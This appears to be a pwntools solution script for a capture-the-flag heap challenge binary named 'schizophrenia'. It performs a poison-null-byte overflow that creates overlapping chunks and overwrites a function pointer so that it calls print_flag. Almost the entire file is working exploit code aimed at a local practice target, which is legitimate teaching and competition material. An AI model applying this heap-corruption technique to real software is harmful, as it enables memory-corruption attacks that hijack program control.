from pwn import *

e = ELF("./schizophrenia")
p = process(e.path)
# p = remote("", )

nums = 0
def alloc(size=16, idx=-1, t="voice", payload=""):
  global p, nums

  if idx == -1:
    idx = nums
    nums += 1

  if len(payload) == 0:
    payload = chr(ord("A") + idx) * 8 

  p.clean()
  p.sendline("1")
  p.sendlineafter("?\n", str(idx))
  p.sendlineafter(")\n", t)
  
  if t == "voice":  
    p.sendlineafter("?\n", str(size))
    p.sendlineafter("?\n", payload)
 
  return idx  

def free(idx):
  global p

  p.clean()
  p.sendline("2")
  p.sendlineafter("?\n", str(idx))

A = alloc(size=0x108)
B = alloc(size=0x210)
# Later versions of glibc have an additional check for the size here
# B = alloc(size=0x200, payload=(0x1f0 - 8) * "A" + p64(0x200))
C = alloc(size=0x100)

free(B)
gdb.attach(p)

free(A)
# Poison null byte happens here. Overwriting the last byte of B's size header.
A = alloc(size=0x108, idx=A, payload="A" * (0x108))


B1 = alloc(0x100)
B2 = alloc(t="thing")
print("Thing at " + str(B2))

free(B1)
free(C)

D = alloc(0x300 - 8, payload=\
  # Padding from chunk_size(0x108) = 0x110 - 8 for the size header
  "A" * (0x110 - 8) + \
  # Size header
  p64(0x21) + \
  # Actual data
  p64(e.symbols["print_flag"]))

# Call B2[0] 
p.sendline("3")
p.sendline(str(B2))

p.interactive()
